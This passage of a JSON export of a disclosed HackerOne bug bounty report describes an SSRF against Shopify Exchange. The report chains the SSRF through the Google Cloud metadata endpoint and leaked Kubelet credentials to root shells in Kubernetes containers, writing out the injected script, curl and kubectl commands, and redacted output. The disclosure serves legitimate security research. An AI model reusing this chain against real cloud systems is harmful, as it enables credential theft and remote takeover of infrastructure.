+            "updated_at": "2018-05-23T21:07:36.391Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Sure! We can disclose this. Thanks for the huge bounty guys!!", 
+            "markdown_message": "<p>Sure! We can disclose this. Thanks for the huge bounty guys!!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2788040, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-23T21:09:28.792Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T21:09:28.792Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2788045, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-23T21:09:28.894Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T21:09:28.894Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2788046, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "0xacb", 
+                "url": "/0xacb"
+            }, 
+            "created_at": "2018-05-23T21:35:58.802Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T21:35:58.802Z", 
+            "actor": {
+                "url": "/shopify", 
+                "profile": {
+                    "name": "Shopify"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+                }
+            }, 
+            "team_handle": "shopify", 
+            "message": "We'd also like to award you with some hacker-exclusive Shopify swag", 
+            "markdown_message": "<p>We&#39;d also like to award you with some hacker-exclusive Shopify swag</p>\n", 
+            "type": "Activities::SwagAwarded", 
+            "id": 2788390, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-23T21:38:01.491Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-23T21:38:01.491Z", 
+            "actor": {
+                "username": "0xacb", 
+                "url": "/0xacb", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/086/176/6b4c526360126ad49e9273323b70d8d27e1e08bc_medium.jpg?1528485899"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thank you so much :)", 
+            "markdown_message": "<p>Thank you so much :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2788404, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-15T17:38:21.550Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-15T17:38:21.550Z", 
+            "actor": {
+                "username": "shopify-peteryaworski", 
+                "url": "/shopify-peteryaworski", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (10.0)", 
+                "old_severity": "Critical"
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2889815, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "old_scope": "your-store.myshopify.com", 
+            "created_at": "2018-06-15T17:38:31.660Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-15T17:38:31.660Z", 
+            "actor": {
+                "username": "shopify-peteryaworski", 
+                "url": "/shopify-peteryaworski", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/175/526/540ca6d631d17896334275083b38566a86be2b2b_medium.jpg?1497551006"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "new_scope": "exchange.shopify.com", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 2889817, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "0xacb", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/0xacb", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/086/176/e47c34d8a5cdbe106b8bdf35004a9df519271406_small.jpg?1528485899"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 68, 
+        "name": "Server-Side Request Forgery (SSRF)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-05-23T21:09:28.855Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/341876", 
+    "created_at": "2018-04-22T23:39:53.445Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"the-exploit-chain-how-to-get-root-access-on-all-shopify-instances\">The Exploit Chain - How to get root access on all Shopify instances</h2>\n\n<h3 id=\"1-access-google-cloud-metadata\">1 - Access Google Cloud Metadata</h3>\n\n<ul>\n<li>1: Create a store (partners.shopify.com)</li>\n<li>2: Edit the template <code>password.liquid</code> and add the following content:</li>\n</ul>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;script&gt;</span>\n<span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"o\">=</span><span class=\"s2\">&quot;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&quot;</span><span class=\"p\">;</span>\n<span class=\"c1\">// iframes don&#39;t work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n</code></pre>\n<ul>\n<li>3: Go to <a title=\"https://exchange.shopify.com/create-a-listing\" href=\"/redirect?signature=5119a70d0ffd1cfeafc0400bed569454f8f7b267&amp;url=https%3A%2F%2Fexchange.shopify.com%2Fcreate-a-listing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://exchange.shopify.com/create-a-listing</span><i class=\"icon-external-link\"></i></a> and install the Exchange app</li>\n<li>4: Wait for the store screenshot to appear on the Create Listing page</li>\n<li>5: Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)</li>\n</ul>\n\n<p>{F289082}</p>\n\n<p>Exploring SSRFs in Google Cloud instances require a special header. However, I found really easy way to &quot;bypass&quot; it while reading the documentation: the <code>/v1beta1</code> endpoint is still available, does not require the <code>Metadata-Flavor: Google</code> header and still returns the same token.</p>\n\n<p>I tried to leak more data, but the web screenshot software wasn&#39;t producing any images for <code>application/text</code> responses. However, I found that I could add the parameter <code>alt=json</code> to force <code>application/json</code> responses. I managed to leak more data, such as an incomplete list of SSH public keys (including email addresses), the project name (<code>\u2588\u2588\u2588\u2588\u2588</code>), the instance name and more:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;script&gt;</span>\n<span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"o\">=</span><span class=\"s2\">&quot;http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json&quot;</span><span class=\"p\">;</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n</code></pre>\n<p>{F289081}</p>\n\n<p><strong>Can I add my SSH key using the leaked token? No</strong></p>\n<pre class=\"highlight shell\"><code>curl -X POST <span class=\"s2\">&quot;https://www.googleapis.com/compute/v1/projects/\u2588\u2588\u2588/setCommonInstanceMetadata&quot;</span> -H <span class=\"s2\">&quot;Authorization: Bearer \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;</span> -H <span class=\"s2\">&quot;Content-Type: application/json&quot;</span> --data <span class=\"s1\">&#39;{&quot;items&quot;: [{&quot;key&quot;: &quot;0xACB&quot;, &quot;value&quot;: &quot;test&quot;}]}&#39;</span>\n</code></pre><pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"w\">\n </span><span class=\"s2\">&quot;error&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;errors&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[</span><span class=\"w\">\n   </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;domain&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;global&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;reason&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;forbidden&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;message&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Required &#39;compute.projects.setCommonInstanceMetadata&#39; permission for &#39;projects/\u2588\u2588\u2588\u2588\u2588\u2588\u2588&#39;&quot;</span><span class=\"w\">\n   </span><span class=\"p\">},</span><span class=\"w\">\n   </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;domain&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;global&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;reason&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;forbidden&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;message&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Required &#39;iam.serviceAccounts.actAs&#39; permission for &#39;projects/\u2588\u2588\u2588\u2588\u2588\u2588\u2588&#39;&quot;</span><span class=\"w\">\n   </span><span class=\"p\">}</span><span class=\"w\">\n  </span><span class=\"p\">],</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;code&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">403</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;message&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Required &#39;compute.projects.setCommonInstanceMetadata&#39; permission for &#39;projects/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&#39;&quot;</span><span class=\"w\">\n </span><span class=\"p\">}</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<p>I checked the scopes for this token and there was no read/write access to the Compute Engine API:</p>\n<pre class=\"highlight shell\"><code>curl <span class=\"s2\">&quot;https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;</span>\n</code></pre><pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"w\">\n </span><span class=\"s2\">&quot;issued_to&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">&quot;audience&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;\u2588\u2588\u2588&quot;</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">&quot;scope&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;https://www.googleapis.com/auth/cloud-platform&quot;</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">&quot;expires_in&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">1307</span><span class=\"p\">,</span><span class=\"w\">\n </span><span class=\"s2\">&quot;access_type&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;offline&quot;</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<h3 id=\"2-dumping-kube-env\">2 - Dumping kube-env</h3>\n\n<p>I created a new store and pulled attributes from this instance recursively: <a title=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&amp;alt=json\" href=\"/redirect?signature=f02e5346c34faf049208ef8a152fa288992f9c20&amp;url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1beta1%2Finstance%2Fattributes%2F%3Frecursive%3Dtrue%26alt%3Djson\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&amp;alt=json</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Result:<br>\n{F289455}</p>\n\n<p><strong>Metadata concealment</strong> (<a title=\"https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment\" href=\"/redirect?signature=800d1491927edd8ed19a6b370a10349a205df89f&amp;url=https%3A%2F%2Fcloud.google.com%2Fkubernetes-engine%2Fdocs%2Fhow-to%2Fmetadata-concealment\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cloud.google.com/kubernetes-engine/docs/how-to/metadata-concealment</span><i class=\"icon-external-link\"></i></a>) is not enabled, so the <code>kube-env</code> attribute is available.</p>\n\n<p>Since the image is cropped, I made a new request to: <a title=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json\" href=\"/redirect?signature=4a55d97599846225ce4d0949bbdd33140356dfd8&amp;url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1beta1%2Finstance%2Fattributes%2Fkube-env%3Falt%3Djson\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json</span><i class=\"icon-external-link\"></i></a> in order to see the rest of the Kubelet certificate and the Kubelet private key.</p>\n\n<p>Result:<br>\n{F289456}</p>\n\n<p><strong>ca.crt</strong></p>\n<pre class=\"highlight plaintext\"><code>-----BEGIN CERTIFICATE-----\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n-----END CERTIFICATE-----\n</code></pre>\n<p><strong>client.crt</strong></p>\n<pre class=\"highlight plaintext\"><code>-----BEGIN CERTIFICATE-----\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n-----END CERTIFICATE-----\n</code></pre>\n<p><strong>client.pem</strong></p>\n<pre class=\"highlight plaintext\"><code>-----BEGIN RSA PRIVATE KEY-----\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n-----END RSA PRIVATE KEY-----\n</code></pre>\n<p><strong>MASTER_NAME</strong>: \u2588\u2588\u2588\u2588\u2588</p>\n\n<h3 id=\"3-using-kubelet-to-execute-arbitrary-commands\">3 - Using Kubelet to execute arbitrary commands</h3>\n\n<p>It&#39;s possible to list all pods {F289460}:</p>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588 get pods --all-namespaces\n\nNAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                    1/1    \n</code></pre>\n<p>And create new pods as well:</p>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml\n\npod <span class=\"s2\">&quot;shell-demo&quot;</span> created\n<span class=\"gp\">$ </span>kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 delete pod shell-demo\n\npod <span class=\"s2\">&quot;shell-demo&quot;</span> deleted\n</code></pre>\n<p>I didn&#39;t tried to delete running pods, obviously, I&#39;m not sure if I would be able to delete them with user <code>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</code>. However, it&#39;s not possible to execute commands in this new pod or any other pod:</p>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 <span class=\"nb\">exec</span> -it shell-demo -- /bin/bash\n\nError from server <span class=\"o\">(</span>Forbidden<span class=\"o\">)</span>: pods <span class=\"s2\">&quot;shell-demo&quot;</span> is forbidden: User <span class=\"s2\">&quot;\u2588\u2588\u2588&quot;</span> cannot create pods/exec <span class=\"k\">in </span>the namespace <span class=\"s2\">&quot;default&quot;</span>: Unknown user <span class=\"s2\">&quot;\u2588\u2588\u2588&quot;</span>\n</code></pre>\n<p>The <code>get secrets</code> command doesn&#39;t work, but it&#39;s possible to describe a given pod and the get the secret using its name. That&#39;s how I leaked the kubernetes.io service account token using the instance <code>\u2588\u2588\u2588\u2588</code> from the namespace <code>\u2588\u2588\u2588\u2588</code>:</p>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588 describe pods/\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\nName:           \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nNamespace:      \u2588\u2588\u2588\u2588\u2588\u2588\nNode:           \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nStart Time:     Fri, 23 Mar 2018 13:53:13 +0000\nLabels:         \u2588\u2588\u2588\u2588\u2588\n                \u2588\u2588\u2588\u2588\n                \u2588\u2588\u2588\u2588\u2588\nAnnotations:    &lt;none&gt;\nStatus:         Running\nIP:             \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nControlled By:  \u2588\u2588\u2588\u2588\u2588\nContainers:\n  default-http-backend:\n    Container ID:   docker://\u2588\u2588\u2588\n    Image:          \u2588\u2588\u2588\u2588\u2588\u2588\n    Image ID:       docker-pullable://\u2588\u2588\u2588\u2588\u2588\n    Port:           \u2588\u2588\u2588\u2588/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Sun, 22 Apr 2018 03:23:09 +0000\n    Last State:     Terminated\n      Reason:       Error\n      Exit Code:    2\n      Started:      Fri, 20 Apr 2018 23:39:21 +0000\n      Finished:     Sun, 22 Apr 2018 03:23:07 +0000\n    Ready:          True\n    Restart Count:  180\n    Limits:\n      cpu:     10m\n      memory:  20Mi\n    Requests:\n      cpu:        10m\n      memory:     20Mi\n    Liveness:     http-get http://:\u2588\u2588\u2588/healthz <span class=\"nv\">delay</span><span class=\"o\">=</span>30s <span class=\"nv\">timeout</span><span class=\"o\">=</span>5s <span class=\"nv\">period</span><span class=\"o\">=</span>10s <span class=\"c\">#success=1 #failure=3</span>\n    Environment:  &lt;none&gt;\n    Mounts:\n      \u2588\u2588\u2588\u2588\u2588\u2588\nConditions:\n  Type           Status\n  Initialized    True\n  Ready          True\n  PodScheduled   True\nVolumes:\n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588:\n    Type:        Secret <span class=\"o\">(</span>a volume populated by a Secret<span class=\"o\">)</span>\n    SecretName: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n    Optional:    <span class=\"nb\">false\n</span>QoS Class:       Guaranteed\nNode-Selectors:  &lt;none&gt;\nTolerations:     node.kubernetes.io/not-ready:NoExecute <span class=\"k\">for </span>300s\n                 node.kubernetes.io/unreachable:NoExecute <span class=\"k\">for </span>300s\nEvents:          &lt;none&gt;\n</code></pre><pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588 get secret\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588\u2588\u2588 -o yaml\n\napiVersion: v1\ndata:\n  ca.crt: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n  namespace: \u2588\u2588\u2588\u2588\n  token: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588<span class=\"o\">==</span>\nkind: Secret\nmetadata:\n  annotations:\n    kubernetes.io/service-account.name: default\n    kubernetes.io/service-account.uid: \u2588\u2588\u2588\u2588\n  creationTimestamp: 2017-01-23T16:08:19Z\n  name:\u2588\u2588\u2588\u2588\u2588\n  namespace: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n  resourceVersion: <span class=\"s2\">&quot;115481155&quot;</span>\n  selfLink: /api/v1/namespaces/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/secrets/\u2588\u2588\u2588\u2588\n  uid: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n<span class=\"nb\">type</span>: kubernetes.io/service-account-token\n</code></pre>\n<p>And finally, it&#39;s possible to use this token to get a shell in any container:</p>\n<pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>kubectl --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588 --token <span class=\"s2\">&quot;\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588&quot;</span> <span class=\"nb\">exec</span> -it w\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -- /bin/bash\n\nDefaulting container name to web.\nUse <span class=\"s1\">&#39;kubectl describe pod/w\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&#39;</span> to see all of the containers <span class=\"k\">in </span>this pod.\n<span class=\"gp\">\u2588\u2588\u2588\u2588\u2588\u2588\u2588:/# </span>id\n<span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>\n<span class=\"gp\">\u2588\u2588\u2588\u2588\u2588:/# </span>ls\napp  boot   dev  <span class=\"nb\">exec  </span>key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\n<span class=\"gp\">\u2588\u2588\u2588\u2588\u2588\u2588\u2588:/# </span><span class=\"nb\">exit</span>\n</code></pre><pre class=\"highlight shell\"><code><span class=\"gp\">$ </span>kubectl --certificate-authority ca.crt --server https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588 --token <span class=\"s2\">&quot;\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;</span> <span class=\"nb\">exec</span> -it \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 -- /bin/bash\n\nDefaulting container name to web.\nUse <span class=\"s1\">&#39;kubectl describe pod/\u2588\u2588\u2588\u2588\u2588 -n \u2588\u2588\u2588\u2588\u2588&#39;</span> to see all of the containers <span class=\"k\">in </span>this pod.\n<span class=\"gp\">root@\u2588\u2588\u2588\u2588:/# </span>id\n<span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>\n<span class=\"gp\">root@\u2588\u2588\u2588\u2588:/# </span>ls\napp  boot   dev  <span class=\"nb\">exec  </span>key  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\n<span class=\"gp\">root@\u2588\u2588\u2588\u2588\u2588:/# </span><span class=\"nb\">exit</span>\n</code></pre>\n<hr>\n\n<p><em>Huge thanks to <a href=\"/redirect?signature=cee7b455517c9986881378ec584e3a74832e0cb1&amp;url=https%3A%2F%2Fwww.linkedin.com%2Fin%2Fluis-maia-7714023a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Lu\u00eds Maia</span><i class=\"icon-external-link\"></i></a> <a href=\"/redirect?signature=044744da20e32babf728d2e2275f494cd12995ff&amp;url=http%3A%2F%2Fhackerone.com%2F0xfad0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>0xfad0</span><i class=\"icon-external-link\"></i></a>, for helping me build this \u2588\u2588\u2588\u2588\u2588</em></p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p><strong>CRITICAL</strong></p>\n\n<p>The hacker selected the <strong>Server-Side Request Forgery (SSRF)</strong> weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:</p>\n\n<p><strong>Can internal services be reached bypassing network access control?</strong><br>\nYes</p>\n\n<p><strong>What internal services were accessible?</strong><br>\nGoogle Cloud Metadata</p>\n\n<p><strong>Security Impact</strong><br>\nRCE</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.shopify.com", 
+            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
+            "twitter_handle": "", 
+            "name": "Shopify"
+        }, 
+        "handle": "shopify", 
+        "url": "https://hackerone.com/shopify", 
